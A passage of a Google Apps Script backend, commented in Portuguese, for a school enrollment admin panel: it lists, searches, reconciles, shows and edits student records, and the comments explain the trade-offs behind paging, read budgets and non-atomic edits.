      Math.max(10, Math.floor(Number(payload.tamanho || PAINEL_TAMANHO_PADRAO)) || PAINEL_TAMANHO_PADRAO));

    var achado = pedido.varrer
      ? alunosPorVarredura_(pedido, pagina, tamanho)
      : alunosPorConsulta_(pedido, pagina, tamanho);

    if (achado.erro) return { ok: false, erro: achado.erro };

    var resposta = {
      ok: true,
      itens: achado.itens.map(formatarAlunoParaTela_),
      total: achado.total,
      pagina: pagina,
      tamanho: tamanho,
      paginas: Math.max(1, Math.ceil(achado.total / tamanho))
    };

    // A lista de cursos vai junto SÓ quando o cliente diz que ainda não a tem.
    //
    // O `select` de curso do `Admin.html` é preenchido uma vez por sessão de tela
    // (`data-carregado`) e DESCARTA as cópias seguintes — então virar de página,
    // clicar em Filtrar ou reabrir a aba pagava, cada vez, uma leitura de ponto
    // por um valor que a tela jogava fora. O padrão continua sendo mandar: quem
    // não conhece o parâmetro (e este arquivo é chamado de fora do painel nos
    // testes de contrato) recebe o mesmo de antes.
    if (payload.cursos !== false) resposta.cursos = painelCursos_().lista;

    return resposta;
  } catch (err) {
    return { ok: false, erro: err.message };
  }
}

/**
 * Traduz os três campos da barra de filtros no plano de consulta.
 *
 * `listar` e `contar` aceitam UM `fieldFilter` só (02_Repo.gs) — não existe
 * predicado OR nem AND de dois campos. Então: um filtro vai para o banco e o
 * resto é decidido em JavaScript, sobre o que o banco devolveu.
 *
 * Quando os dois filtros estão preenchidos, quem vai para o banco é o CURSO. Não
 * é sorteio: são ~12 cursos contra 4 status, então o balde do curso é, em média,
 * três vezes menor — e é o tamanho do balde que decide quantos documentos a
 * varredura paga.
 */
function pedidoDeAlunos_(payload) {
  var status = String(payload.status || '').trim();
  var curso = String(payload.curso || '').trim();
  var busca = String(payload.busca || '').trim();

  var filtro = null;
  if (curso) filtro = { campo: 'curso', valor: curso };
  else if (status) filtro = { campo: 'status', valor: status };

  var alvo = normalizarTexto(busca);

  // `peneira` confere os DOIS filtros da barra, em JavaScript, e não só o que
  // sobrou de fora do `fieldFilter`.
  //
  // Ela conferia só o status, e só quando os dois filtros estavam preenchidos —
  // o que bastava para a varredura, onde o curso já tinha ido para o banco no
  // `fieldFilter`. Mas `colherAlunos_` usa esta mesma peneira no caminho da busca
  // EXATA, e lá a consulta filtra por matrícula/CPF/e-mail e mais nada: o filtro
  // de curso era descartado no caminho. Com `curso = MKT` e a matrícula de um
  // aluno de ADS colada na busca, a tela mostrava o aluno de ADS dentro da lista
  // de MKT, e o botão Exportar ao lado exportava a mesma linha. Não corrompia
  // dado; mentia na tela, que é o que este sistema não aceita.
  //
  // Na varredura a conferência agora é redundante — o banco já filtrou pelo mesmo
  // campo — e redundante é barato: são comparações de string sobre documentos que
  // já estão na memória. O caminho que ficou correto é o que custava 2 leituras.
  var peneira = function (a) {
    if (curso && String(a.curso) !== curso) return false;
    if (status && String(a.status) !== status) return false;
    return true;
  };

  return {
    filtro: filtro,
    busca: busca,
    // Varre quando há busca por texto, ou quando os DOIS filtros estão
    // preenchidos — só um deles cabe no `fieldFilter`, e o outro precisa de
    // alguém para conferir documento a documento.
    varrer: Boolean(busca) || Boolean(curso && status),
    peneira: peneira,
    aceita: function (a) {
      if (!peneira(a)) return false;
      if (!alvo) return true;
      // Os mesmos seis campos que o sistema em produção junta para buscar.
      var texto = normalizarTexto([a.nome, a.email, a.cpf, a.matricula, a.curso, a.turma].join(' '));
      return texto.indexOf(alvo) !== -1;
    }
  };
}

/** Caminho de consulta: `fieldFilter` no banco, paginação por cursor. */
function alunosPorConsulta_(pedido, pagina, tamanho) {
  if (pagina > PAINEL_MAX_PAGINA) return { erro: recusaDePagina_() };

  var total = pedido.filtro ? contar(ALUNOS_COLECAO, pedido.filtro) : contar(ALUNOS_COLECAO);

  var itens = [];
  var cursor = null;

  // A caminhada é o preço de o `Admin.html` paginar por número — ver
  // PAINEL_MAX_PAGINA. Página 1 não caminha: o laço roda uma vez.
  for (var n = 1; n <= pagina; n++) {
    var resposta = listar(ALUNOS_COLECAO, opcoesDeBusca_(pedido.filtro, tamanho, cursor));
    itens = resposta.itens;
    cursor = resposta.cursor;

    // Página pedida além do fim da lista: devolve vazia em vez de repetir a
    // última. Acontece quando alguém remove registros com o painel aberto.
    if (!cursor && n < pagina) return { itens: [], total: total };
  }

  return { itens: itens, total: total };
}

/**
 * Caminho de busca: tenta a igualdade e, se não achar, varre.
 *
 * A paginação aqui é em memória, sobre o conjunto já filtrado — então `total` e
 * `paginas` são exatos dentro do teto, e não estimativas.
 */
function alunosPorVarredura_(pedido, pagina, tamanho) {
  var colhido = colherAlunos_(pedido, PAINEL_TETO_VARREDURA);
  var inicio = (pagina - 1) * tamanho;

  return {
    itens: colhido.itens.slice(inicio, inicio + tamanho),
    total: colhido.itens.length
  };
}

/**
 * Todos os alunos que casam com o pedido: pela igualdade, se der, senão varrendo.
 *
 * Compartilhada por `listarAlunos` e `exportarCsv`, e é por isso que ela existe
 * como função: sem ela, a tela acharia um aluno pelo CPF (igualdade no banco) e o
 * botão Exportar, ao lado, entregaria um arquivo vazio — porque a varredura
 * compara texto normalizado e '529.982.247-25' nunca casa com '52998224725'. Duas
 * respostas diferentes para o mesmo filtro, na mesma tela.
 */
function colherAlunos_(pedido, teto) {
  var exata = chaveExataDaBusca_(pedido.busca);

  if (exata) {
    // Bloco em vez do tamanho da página: matrícula, CPF e e-mail são únicos por
    // aluno, então isto traz o conjunto inteiro e a paginação acontece em
    // memória, igual à da varredura.
    var direto = listar(ALUNOS_COLECAO, opcoesDeBusca_(exata, PAINEL_BLOCO, null)).itens
      .filter(pedido.peneira);
    if (direto.length) return { itens: direto, truncado: false };
  }

  return varrerAlunos_(pedido.filtro, pedido.aceita, teto);
}

/**
 * Se a busca digitada casa com um campo exato, e qual.
 *
 * É o que separa "colei a matrícula do aluno" (uma leitura) de "lembro parte do
 * nome" (varredura). Devolve null quando não dá para decidir — e null é sempre
 * seguro: significa varrer.
 */
function chaveExataDaBusca_(busca) {
  var texto = String(busca || '').trim();
  if (!texto) return null;

  if (texto.indexOf('@') !== -1) return { campo: 'email', valor: normalizarEmail(texto) };

  // Pontuação de CPF e de matrícula é ruído; letra no meio já indica nome.
  var limpo = texto.replace(/[\s.\-\/]/g, '');
  if (!/^[0-9]+$/.test(limpo)) return null;

  if (limpo.length === 11 && cpfValido(limpo)) return { campo: 'cpf', valor: normalizarCpf(limpo) };
  if (limpo.length >= 4 && limpo.length <= 20) {
    return { campo: 'matricula', valor: normalizarMatricula(limpo) };
  }
  return null;
}

/**
 * Percorre `alunos` em blocos, aplicando a peneira, até o teto.
 *
 * Compartilhada por `listarAlunos` (busca por nome) e `exportarCsv` (exportação
 * inteira). É o único lugar do arquivo que lê muitos documentos, e por isso o
 * teto é parâmetro obrigatório: não existe chamada sem limite.
 */
function varrerAlunos_(filtro, aceita, teto) {
  var itens = [];
  var lidos = 0;
  var cursor = null;

  do {
    var resposta = listar(ALUNOS_COLECAO, opcoesDeBusca_(filtro, PAINEL_BLOCO, cursor));
    lidos += resposta.itens.length;

    resposta.itens.forEach(function (a) {
      if (!aceita || aceita(a)) itens.push(a);
    });

    cursor = resposta.cursor;
  } while (cursor && lidos < teto);

  return { itens: itens, lidos: lidos, truncado: Boolean(cursor) };
}

/**
 * Monta as opções de `listar` sem NUNCA declarar `ordenarPor`.
 *
 * Duas armadilhas de uma vez:
 *
 *   1. filtro num campo somado a ordenação por OUTRO exige índice composto — um
 *      passo de console repetido a cada ambiente novo, descoberto no pior dia.
 *      Sem `ordenarPor`, `listar` ordena por `__name__` ASCENDENTE, que é o
 *      desempate embutido em todo índice automático de campo único;
 *   2. o cursor de `listar` carrega UM valor. Ordenar por `nome` faria o cursor
 *      ser "o último nome desta página", e `before: false` significa
 *      ESTRITAMENTE depois: dois alunos homônimos na virada da página e o segundo
 *      some da lista, calado. Homônimo não é caso exótico aqui — é metade do
 *      motivo de a reconciliação existir. `__name__` é único por construção.
 *
 * O preço é a ordem não ser alfabética. Quem procura alguém usa a busca.
 */
function opcoesDeBusca_(filtro, limite, cursor) {
  var opcoes = { limite: limite };
  if (filtro) {
    opcoes.campo = filtro.campo;
    opcoes.valor = filtro.valor;
  }
  if (cursor) opcoes.cursor = cursor;
  return opcoes;
}

// ------------------------------------------- Atualizar (a reconciliação junto)

/**
 * Botão Atualizar da aba Alunos: cruza os dados e devolve a lista, numa chamada.
 *
 * POR QUE JUNTO, que foi o pedido: `alunos` é uma coleção DERIVADA, escrita pela
 * reconciliação. Uma inscrição que acabou de chegar existe em `inscricoes` e não
 * existe em `alunos` — então recarregar a lista sem cruzar mostra o retrato de
 * antes da última inscrição, e o professor não tem como saber disso olhando a
 * tela. Era o que já acontecia com o botão Filtrar.
 *
 * POR QUE UMA CHAMADA SÓ, e não o navegador chamando duas: cada chamada ao
 * `google.script.run` é uma execução do Apps Script, com ~1,5 s de custo fixo
 * antes de qualquer trabalho. Duas em fila são duas esperas, e a segunda ainda
 * reconferiria o mesmo token.
 *
 * O CUSTO e os dois freios estão em PAINEL_ORCAMENTO_RECONCILIACAO. Em resumo:
 * dez cliques seguidos custam dez pares de agregações e UMA reconciliação, no
 * máximo — as outras nove são recusadas por não ter o que cruzar.
 *
 * A recusa NUNCA quebra o botão: a lista sempre recarrega, e o motivo de não ter
 * cruzado volta em `reconciliacao.motivo`, para a tela dizer em vez de esconder.
 */
function atualizarAlunos(payload) {
  try {
    exigirAdmin(payload && payload.token);
    payload = payload || {};

    var rodada = reconciliarSeValerAPena_();

    // `listarAlunos` reconfere o token, e isso não custa leitura nenhuma (a
    // sessão vive em PropertiesService). Reaproveitá-la inteira é o que garante
    // que Atualizar e Filtrar mostrem exatamente a mesma coisa: filtro, busca,
    // paginação e teto de página são de lá, e não podem existir em dois lugares.
    var lista = listarAlunos(payload);
    lista.reconciliacao = rodada;
    return lista;
  } catch (err) {
    return { ok: false, erro: err.message };
  }
}

/**
 * Roda a reconciliação, se ela tiver o que fazer e couber no orçamento do dia.
 *
 * Devolve sempre { rodou, motivo, resumo, custo } — nunca lança. Uma falha da
 * reconciliação não pode derrubar a lista de alunos junto: a lista é lida das
 * mesmas coleções e continua correta (só mais velha) quando o cruzamento falha.
 */
function reconciliarSeValerAPena_() {
  var marca = marcaDaReconciliacao_();

  // As duas agregações são o freio 1. Elas custam um punhado de leituras contra
  // as ~5.500 da rodada, e é essa desproporção que faz o freio valer a pena.
  var inscricoes = contar(INSCRICOES_COLECAO);
  var matriculados = contar(MATRICULADOS_COLECAO);

  if (marca.em && marca.inscricoes === inscricoes && marca.matriculados === matriculados) {
    return {
      rodou: false,
      motivo: 'Não cruzei os dados de novo: nada entrou desde a última vez (' + marca.em + '). ' +
              'A lista abaixo está atualizada.'
    };
  }

  // O custo da PRÓXIMA rodada é estimado pelo tamanho medido na ANTERIOR. Na
  // primeira vez não há o que estimar, e a rodada passa: uma reconciliação
  // sozinha não estoura um orçamento que vale por três delas.
  if (marca.dia === diaDeHoje_() && marca.gasto + marca.custo > PAINEL_ORCAMENTO_RECONCILIACAO) {
    return {
      rodou: false,
      motivo: 'Não cruzei os dados: o cruzamento já consumiu ' + marca.gasto + ' das ' +
              PAINEL_ORCAMENTO_RECONCILIACAO + ' leituras reservadas para ele hoje, e cada rodada ' +
              'custa cerca de ' + marca.custo + '. O resto da cota diária é do formulário dos alunos. ' +
              'A rodada automática das 5h refaz tudo; se não puder esperar, use "Reconciliar agora" ' +
              'na aba Painel. A lista abaixo está atualizada.'
    };
  }

  try {
    var resumo = reconciliar();
    var custo = marcarReconciliacao_(marca);

    // Os dez números da aba Painel acabaram de mudar de valor — status, totais e
    // o histograma de cursos saem todos daqui. Sem esta linha, o professor
    // atualiza a lista, volta ao Painel e vê os números de antes por até
    // PAINEL_CACHE_S segundos.
    invalidarCachePainel_();

    return { rodou: true, resumo: resumo, custo: custo, motivo: '' };
  } catch (err) {
    console.error('atualizarAlunos (reconciliação): ' + err.message);
    return { rodou: false, erro: err.message, motivo: 'A lista foi recarregada, mas o cruzamento ' +
             'falhou: ' + err.message };
  }
}

/** A marca da última reconciliação do painel, já com os campos garantidos. */
function marcaDaReconciliacao_() {
  var vazia = { inscricoes: -1, matriculados: -1, em: '', dia: '', gasto: 0, custo: 0 };
  try {
    var bruto = PropertiesService.getScriptProperties().getProperty(PAINEL_MARCA_RECONCILIACAO);
    if (!bruto) return vazia;

    var marca = JSON.parse(bruto);
    return {
      inscricoes: Number(marca.inscricoes),
      matriculados: Number(marca.matriculados),
      em: String(marca.em || ''),
      dia: String(marca.dia || ''),
      gasto: Number(marca.gasto) || 0,
      custo: Number(marca.custo) || 0
    };
  } catch (e) {
    // Marca ilegível é marca que não existe: o preço é uma rodada a mais, e o
    // preço de estourar aqui seria o botão Atualizar parar de funcionar.
    console.error('marca da reconciliação ilegível: ' + e.message);
    return vazia;
  }
}

/**
 * Guarda o tamanho das três coleções DEPOIS da rodada, e cobra o custo do dia.
 *
 * Depois, e não antes, por duas razões: uma inscrição pode ter entrado durante os
 * segundos do cruzamento (e ela precisa contar como "novidade" no próximo
 * clique), e o custo cobrado passa a ser o tamanho real do que foi lido, não uma
 * previsão. As três agregações somam alguns poucos documentos contra as milhares
 * que a rodada acabou de ler.
 *
 * Devolve o custo medido, que é o que a resposta mostra e o que serve de
 * estimativa para a rodada seguinte.
 */
function marcarReconciliacao_(marcaAnterior) {
  var inscricoes = contar(INSCRICOES_COLECAO);
  var matriculados = contar(MATRICULADOS_COLECAO);
  var alunos = contar(ALUNOS_COLECAO);

  // A mesma conta do cabeçalho de 06_Reconciliacao.gs: as três coleções inteiras
  // mais a leitura do documento de agregados.
  var custo = inscricoes + matriculados + alunos + 1;
  var hoje = diaDeHoje_();
  var gasto = (marcaAnterior && marcaAnterior.dia === hoje ? marcaAnterior.gasto : 0) + custo;

  try {
    PropertiesService.getScriptProperties().setProperty(PAINEL_MARCA_RECONCILIACAO, JSON.stringify({
      inscricoes: inscricoes, matriculados: matriculados,
      em: agora(), dia: hoje, gasto: gasto, custo: custo
    }));
  } catch (e) {
    // Sem marca, o próximo clique cruza de novo. Caro, e correto.
    console.error('marcarReconciliacao_: ' + e.message);
  }

  return custo;
}

function diaDeHoje_() {
  return agora().slice(0, 10);
}

function recusaDePagina_() {
  return 'Não consigo ir além da página ' + PAINEL_MAX_PAGINA + ': cada página seguinte ' +
         'exige reler as anteriores. Use a busca (matrícula, CPF ou e-mail acham direto) ' +
         'ou filtre por status ou curso.';
}

/**
 * Documento -> linha da tela. O `id` vem do NOME do documento.
 *
 * `_id` é o metadado que o Repo acrescenta na leitura, e é a única fonte de
 * verdade do id — é ele que volta em `resolverAluno` e `detalheAluno`. Um campo
 * `id` gravado seria uma cópia livre para divergir; se existir, perde.
 */
function formatarAlunoParaTela_(a) {
  return {
    id: a._id || a.id || '',
    nome: a.nome,
    cpf: formatarCpf(a.cpf),
    email: a.email,
    telefone: formatarTelefone(a.telefone),
    data_nascimento: formatarData(a.data_nascimento),
    matricula: a.matricula,
    matricula_conferida: a.matricula_conferida,
    curso: a.curso,
    turma: a.turma,
    situacao: a.situacao,
    status: a.status,
    statusLabel: STATUS_LABEL[a.status] || a.status,
    metodo_match: a.metodo_match,
    score_match: a.score_match,
    observacoes: a.observacoes,
    revisado_por: a.revisado_por,
    revisado_em: a.revisado_em
  };
}

/**
 * O aluno lado a lado: o que veio da inscrição × o que veio da lista oficial.
 *
 * É o maior ganho deste arquivo. O sistema sobre Sheets varria TRÊS tabelas
 * inteiras para achar três registros — com 2.500 alunos, 2.500 inscrições e 2.500
 * matriculados, são 7.500 leituras para abrir um modal. Aqui são três leituras de
 * ponto, porque os três documentos têm endereço conhecido (ver a suposição 2 no
 * cabeçalho).
 */
function detalheAluno(payload) {
  try {
    exigirAdmin(payload && payload.token);
    payload = payload || {};

    var id = String(payload.id || '').trim();
    if (!id) return { ok: false, erro: 'Aluno não informado.' };

    var aluno = ler(ALUNOS_COLECAO, id);
    if (!aluno) return { ok: false, erro: 'Aluno não encontrado. Recarregue a lista.' };

    var inscricao = aluno.inscricao_id ? ler(INSCRICOES_COLECAO, aluno.inscricao_id) : null;

    // A matrícula normalizada É o id do documento em `matriculados`. Derivar
    // quando `matricula_id` vem vazio não é remendo: é a mesma regra que a
    // importação usou para escolher o id, escrita do lado de quem lê.
    var enderecoMatricula = aluno.matricula_id || normalizarMatricula(aluno.matricula);
    var matriculado = enderecoMatricula ? ler(MATRICULADOS_COLECAO, enderecoMatricula) : null;

    var resposta = {
      ok: true,
      aluno: formatarAlunoParaTela_(aluno),
      inscricao: inscricao ? {
        recebido_em: inscricao.criado_em,
        origem: inscricao.origem,
        projeto: inscricao.projeto_nome,
        // O id vai junto do nome porque a janela de edição precisa saber de ONDE
        // o aluno sai para migrar. `colunaComparativo` (Admin.html) desenha só as
        // chaves que conhece, então ele não aparece na tela de detalhe.
        projeto_id: inscricao.projeto_id || '',
        matricula: inscricao.matricula,
        matricula_conferida: inscricao.matricula_conferida,
        nome: inscricao.nome,
        email: inscricao.email,
        whatsapp: formatarTelefone(inscricao.whatsapp),
        curso_fase: inscricao.curso_fase,
        // CPF e nascimento só aparecem se existirem: são de inscrições antigas,
        // de quando o CPF era a chave. Nenhum formulário atual os coleta.
        cpf: inscricao.cpf ? formatarCpf(inscricao.cpf) : '',
        data_nascimento: formatarData(inscricao.data_nascimento),
        observacoes: inscricao.observacoes,
        declara_ciencia: inscricao.declara_ciencia,
        autoriza_imagem: inscricao.autoriza_imagem,
        consentimento_lgpd: inscricao.consentimento_lgpd
      } : null,
      matriculado: matriculado ? {
        lote: matriculado.lote_id,
        importado_em: matriculado.importado_em,
        nome: matriculado.nome,
        cpf: formatarCpf(matriculado.cpf),
        email: matriculado.email,
        matricula: matriculado.matricula,
        data_nascimento: formatarData(matriculado.data_nascimento),
        curso: matriculado.curso,
        turma: matriculado.turma,
        situacao: matriculado.situacao
      } : null
    };

    // A lista de projetos só viaja quando alguém a pediu — é o mesmo cuidado que
    // `listarAlunos` toma com a lista de cursos. Ela custa 1 consulta mais uma
    // agregação POR PROJETO (`listarProjetos`, 09_Projetos.gs), e o modal de
    // detalhe, que é o mais aberto dos dois, não tem o que fazer com ela.
    if (payload.projetos === true) resposta.projetos = projetosParaMigracao_();

    return resposta;
  } catch (err) {
    return { ok: false, erro: err.message };
  }
}

/**
 * Os projetos que a janela de edição oferece, com a ocupação de agora.
 *
 * A ocupação vai junto de propósito: quem migra um aluno para um projeto lotado
 * precisa ver que ele está lotado ANTES de migrar, e ver o número subir depois.
 * É a mesma contagem derivada que o site usa, então ela não tem como mentir.
 *
 * Vêm TODOS, inclusive os inativos e os de inscrições fechadas: a migração é ação
 * de coordenação e passa por fora dessas travas de propósito (ver `editarAluno`).
 * O que a tela faz é dizer a situação de cada um, não escondê-los.
 */
function projetosParaMigracao_() {
  return listarProjetos(false).map(function (p) {
    return {
      id: p.id, nome: p.nome, vagas: p.vagas, inscritos: p.inscritos,
      situacao: p.situacao, acimaDoTeto: p.vagas > 0 && p.inscritos > p.vagas
    };
  });
}

/**
 * Registra a decisão da coordenação sobre um aluno (resolve a divergência).
 *
 * A ordem das conferências não é estética: o status é validado ANTES de ler o
 * aluno, para uma requisição malformada não custar leitura nenhuma.
 *
 * A leitura que sobra é obrigatória, e pelo mesmo motivo que `salvarProjeto`
 * (09_Projetos.gs) confere existência antes de gravar: `atualizar` é um PATCH, e
 * PATCH no Firestore CRIA o documento que não existe. Sem esta linha, um painel
 * aberto desde antes de uma reimportação criaria um "aluno" só com status e
 * observação — sem nome, sem matrícula, sem origem —, e ele apareceria na lista
 * como um registro fantasma que ninguém sabe de onde veio.
 */
function resolverAluno(payload) {
  try {
    exigirAdmin(payload && payload.token);
    payload = payload || {};

    var id = String(payload.id || '').trim();
    if (!id) return { ok: false, erro: 'Aluno não informado.' };

    var novoStatus = String(payload.status || '').trim();
    var validos = [STATUS.CONFIRMADO, STATUS.SO_INSCRITO, STATUS.SO_MATRICULADO, STATUS.DIVERGENCIA];
    if (validos.indexOf(novoStatus) === -1) return { ok: false, erro: 'Status inválido.' };

    var alvo = ler(ALUNOS_COLECAO, id);
    if (!alvo) return { ok: false, erro: 'Aluno não encontrado. Recarregue a lista.' };

    var carimbo = agora();
    atualizar(ALUNOS_COLECAO, id, {
      status: novoStatus,
      // Teto no texto livre: o campo vai para um documento que o painel relê a
      // cada listagem, e não há por que carregar um romance colado sem querer.
      observacoes: String(payload.observacoes || '').trim().slice(0, PAINEL_MAX_OBSERVACOES),
      revisado_por: usuarioAtual(),
      revisado_em: carimbo,
      atualizado_em: carimbo
    });

    registrar('REVISAO', 'aluno', id, alvo.status + ' -> ' + novoStatus);

    // Este aluno acabou de sair de um balde de status e entrar em outro, então os
    // números guardados da aba Painel deixaram de ser verdade. Sem esta linha, a
    // professora resolve uma divergência, volta para o Painel e continua vendo a
    // divergência contada por até PAINEL_CACHE_S segundos — que é exatamente o
    // jeito de um cache mentir para quem escreveu.
    invalidarCachePainel_();

    return { ok: true };
  } catch (err) {
    return { ok: false, erro: err.message };
  }
}

// ------------------------------------------------- Editar a ficha do aluno

/**
 * Corrige a ficha de um aluno: matrícula, nome, turma e o projeto em que ele está.
 *
 * -------------------------------------------------------- O caso que a criou
 *
 * "Um aluno conseguiu colocar a matrícula de outro". O estrago desse erro não é o
 * que parece: a inscrição de A entra com a matrícula de B, a reconciliação casa A
 * com o MATRICULADO de B (degrau 0 da cascata, o mais forte), e a ficha resultante
 * fica com o nome, o curso e a turma de B. Pior, B — que não se inscreveu — some
 * do cadastro, porque o matriculado dele foi CONSUMIDO por A (`usados`,
 * 06_Reconciliacao.gs). Uma matrícula errada apaga uma pessoa da lista.
 *
 * -------------------------------------------- Por que a correção vai na FONTE
 *
 * `alunos` é derivada: a rodada das 5h a reconstrói inteira. Corrigir a matrícula
 * na linha do cadastro duraria até a madrugada, e sumiria sem aviso — que é
 * exatamente o tipo de mentira silenciosa que este sistema não aceita. Então a
 * correção é gravada na inscrição, que é onde o dado nasceu, e o cadastro é
 * recalculado por cima. Ver o mapa de "o que este arquivo escreve" no cabeçalho.
 *
 * ------------------------------------------- O id da inscrição MUDA junto, e é
 *                                             isso que exige cuidado
 *
 * O id do documento em `inscricoes` É a chave de dedup (`chaveDedup_`,
 * 04_Inscricoes.gs), e ela é feita de projeto + matrícula (ou CPF, ou e-mail+nome).
 * Mudar a matrícula ou o projeto muda o ENDEREÇO do documento — não dá para
 * "atualizar" a inscrição, ela precisa MUDAR DE LUGAR. O que acontece, na ordem:
 *
 *   1. `inserir` no endereço NOVO, com `documentId`. Se o endereço já estiver
 *      ocupado, o banco responde 409 ALREADY_EXISTS e a operação PARA AQUI, sem
 *      ter apagado nada. Endereço ocupado significa exatamente uma coisa: esta
 *      pessoa já tem inscrição neste projeto. É a mesma garantia atômica que
 *      protege o formulário público, e é ela — e não uma consulta nossa — que
 *      impede a correção de criar duas inscrições da mesma pessoa no mesmo
 *      projeto;
 *   2. `excluir` no endereço VELHO.
 *
 * As duas escritas NÃO são atômicas entre si (o Repo não tem `:commit` misto, e
 * usar `escreverEmLote` seria pior: ele é upsert, e SOBRESCREVERIA a inscrição de
 * quem já estivesse no endereço novo). Se a segunda falhar, sobram duas inscrições
 * da mesma pessoa — uma no endereço velho, uma no novo —, o projeto conta um
 * inscrito a mais e o professor vê a linha duplicada na tela. Feio, visível e
 * corrigível; não é perda de dado. É a mesma troca que a edição de disciplinas já
 * fez (12_Disciplinas.gs), pelo mesmo motivo.
 *
 * ---------------------------------------------------- E o cadastro por cima
 *
 * Quando a mudança altera a CHAVE DA PESSOA (`chaveDePessoa_`: matrícula > CPF >
 * e-mail+nome), a linha de `alunos` também muda de endereço — e mais: o
 * matriculado de B fica livre, o status precisa ser recalculado pela cascata, e
 * curso e turma vêm de outro lugar. Nada disso dá para escrever à mão sem
 * reimplementar a reconciliação dentro deste arquivo. Então este é o único caso em
 * que a edição chama `reconciliar()` — caro (ver PAINEL_ORCAMENTO_RECONCILIACAO),
 * raro, e o único jeito de o resultado ficar certo. De quebra, o endereço velho
 * costuma ser reaproveitado na mesma rodada: ele é o `chaveAluno_` da matrícula de
 * B, e B volta ao cadastro como SO_MATRICULADO exatamente ali.
 *
 * Nos outros casos — nome, turma, e a migração de projeto — a linha do cadastro é
 * atualizada por PROJEÇÃO: os mesmos campos, com a mesma precedência de
 * `montarAluno_`. Sem reconciliação, e sem mentira na tela.
 *
 * ------------------------------- O que o 409 NÃO cobre, e por isso é perguntado
 *
 * O 409 do banco fecha uma colisão só: a mesma pessoa no MESMO projeto. A
 * matrícula, porém, é a chave da PESSOA — ela atravessa todos os projetos —, e
 * corrigi-la de A para B mexe em duas vizinhanças que o endereço do documento não
 * enxerga. As duas foram exercitadas contra o cruzamento de verdade, e as duas
 * terminavam com "Ficha atualizada." e mais nada:
 *
 *   1. AS QUE FICAM PARA TRÁS. A mesma pessoa em dois projetos tem DUAS
 *      inscrições, e a janela edita a que o cadastro aponta. Corrigida uma, a
 *      outra continua com a matrícula errada — e a rodada seguinte parte a pessoa
 *      em duas fichas: uma certa, com um projeto, e outra ainda no nome do dono da
 *      matrícula velha, carregando o projeto que sobrou. Quem olha a tela vê a
 *      linha certa e conclui que acabou;
 *   2. AS QUE JÁ USAM A MATRÍCULA NOVA. Se B já tem inscrição em OUTRO projeto, o
 *      409 não dispara (projetos diferentes, endereços diferentes) e a
 *      reconciliação FUNDE as duas pessoas numa ficha só — mesma `chaveAluno_` —,
 *      com um nome só e os dois projetos somados. Nenhuma inscrição se perde, e
 *      mesmo assim uma pessoa some do cadastro.
 *
 * Então a correção de matrícula pergunta as duas coisas LOGO DEPOIS de escrever,
 * com duas consultas de um `fieldFilter` (a mesma forma de `outrosProjetosDe_`,
 * sem índice novo), e devolve o que achou nos `avisos` — com projeto e nome, que é o
 * que permite à coordenação decidir se digitou errado ou se é a mesma pessoa. Ela
 * NÃO recusa: as duas situações têm caso legítimo (a pessoa realmente está em dois
 * projetos; a pessoa realmente já tinha uma inscrição certa), e recusar deixaria a
 * coordenação sem saída nenhuma. O que não pode é acontecer em silêncio.
 *
 * O que ficou de fora de propósito: corrigir SOZINHO as inscrições que ficaram
 * para trás. São N pares de escrita não atômicos disparados por um clique, cada um
 * com o seu 409 possível, e a decisão de que uma correção de matrícula vale para a
 * pessoa inteira (e não para a inscrição aberta) é de quem opera, não deste
 * arquivo. O aviso diz onde estão.
 *
 * ------------------------------------------- A vaga, na migração de projeto
 *
 * Foram três pedidos, e os três saem de graça — porque `inscritos` é DERIVADO:
 * `contarInscritos_` (09_Projetos.gs) conta os documentos de `inscricoes` com
 * aquele `projeto_id`, e não existe contador gravado em lugar nenhum.
 *
 *   a vaga conta de verdade ..... a inscrição mudou de `projeto_id`, então a
 *                                 agregação do destino passa de 20 para 21 na
 *                                 mesma hora, no painel e no site. Não há número
 *                                 para incrementar nem para esquecer;
 *   o teto não bloqueia ......... esta função NÃO chama `reservarVaga`. É ela
 *                                 quem recusa por ESGOTADO, e ela existe para o
 *                                 caminho do aluno. A coordenação passa por fora;
 *   o contador mostra a verdade . 61 de 60, e não 60 de 60. O único lugar que
 *                                 arredondaria seria um `Math.min`, e não há
 *                                 nenhum: `listarProjetos` devolve `inscritos`
 *                                 cru (só `restantes` é preso em zero, porque
 *                                 "faltam -1 vagas" não é frase).
 *
 * O que NÃO se enfraquece: o formulário público continua contando dentro do lock
 * e continua recusando quem chega em projeto cheio — `situacaoDe_` devolve
 * ESGOTADO com 61 de 60 do mesmo jeito que com 60. A exceção é do painel, e ela é
 * de uma migração por vez, feita por uma pessoa identificada, com linha no
 * histórico dizendo de onde saiu, para onde foi e quanto o destino ficou.
 *
 * E o lock NÃO é tomado aqui, de propósito. `getScriptLock` é global: pegá-lo
 * poria o clique da coordenação atrás da fila inteira do auditório, que é a mesma
 * conta que `removerProjeto` (09_Projetos.gs) já fez e recusou. O pior que a
 * corrida faz é uma vaga a mais num projeto onde a coordenação acabou de decidir
 * estourar o teto de propósito.
 */
function editarAluno(payload) {
  try {
    exigirAdmin(payload && payload.token);
    payload = payload || {};

    var id = String(payload.id || '').trim();
    if (!id) return { ok: false, erro: 'Aluno não informado.' };

    // Formato antes de qualquer leitura: pedido malformado não custa cota.
    var recusa = conferirFormatoDaEdicao_(payload);
    if (recusa) return { ok: false, erro: recusa };

    var aluno = ler(ALUNOS_COLECAO, id);
    if (!aluno) return { ok: false, erro: 'Aluno não encontrado. Recarregue a lista.' };

    var inscricao = aluno.inscricao_id ? ler(INSCRICOES_COLECAO, aluno.inscricao_id) : null;
    var endereco = aluno.matricula_id || normalizarMatricula(aluno.matricula);
    var matriculado = endereco ? ler(MATRICULADOS_COLECAO, endereco) : null;

    var plano = planejarEdicao_(payload, aluno, inscricao, matriculado);
    if (plano.erro) return { ok: false, erro: plano.erro };
    if (!plano.mudou) return { ok: true, id: id, mensagem: 'Nada a salvar: nenhum campo mudou.' };

    return aplicarEdicao_(id, aluno, inscricao, matriculado, plano);
  } catch (err) {
    console.error('editarAluno: ' + err.message);
    return { ok: false, erro: err.message };
  }
}

/**
 * Conferências que não dependem do banco. Devolve '' quando está tudo bem.
 *
 * O nome NÃO é obrigado a ter duas palavras aqui, ao contrário de
 * `validarInscricao` (04_Inscricoes.gs): lá quem digita é o aluno, e a exigência
 * pega o "Maria" apressado; aqui quem digita é a coordenação, corrigindo um
 * cadastro que ela tem na frente. Recusar "Xu Li" seria o sistema achando que
 * sabe mais que o humano sobre o nome de uma pessoa.
 */
function conferirFormatoDaEdicao_(payload) {
  if (payload.matricula !== undefined) {
    var matricula = normalizarMatricula(payload.matricula);
    if (matricula && (matricula.length < 4 || matricula.length > 20)) {
